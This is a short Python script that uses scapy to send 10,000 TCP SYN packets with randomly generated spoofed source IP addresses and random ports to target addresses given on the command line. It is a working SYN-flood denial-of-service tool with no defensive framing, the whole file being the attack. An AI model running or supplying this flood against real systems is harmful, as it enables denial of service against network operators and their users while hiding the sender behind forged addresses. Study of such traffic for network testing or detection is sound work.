import sys
import time
from os import popen
from scapy.all import sendp, IP, UDP, Ether, TCP, RandShort
from random import randrange

def sourceIPgen():
    not_valid = [10,127,254,255,1,2,169,172,192]
    first = randrange(1, 256)

    while first in not_valid:
        first = randrange(1, 256)
    print(first)
    ip = ".".join([str(first), str(randrange(1, 256)), str(randrange(1, 256)), str(randrange(1, 256))])
    print(ip)
    return ip

def main():
    dstIPs = sys.argv[1:]
    print(dstIPs)
    interface = popen('ifconfig | awk \'/eth0/ {print $1}\'').read()
    print(repr(interface))
    for i in range(10000):
        packets = Ether()/IP(dst=dstIPs, src=sourceIPgen())/TCP(dport=int(RandShort()), sport=int(RandShort()), flags="S")
        print(repr(packets))
        sendp(packets, iface=interface.rstrip(), inter=0.05)



if __name__ == "__main__":
    main()

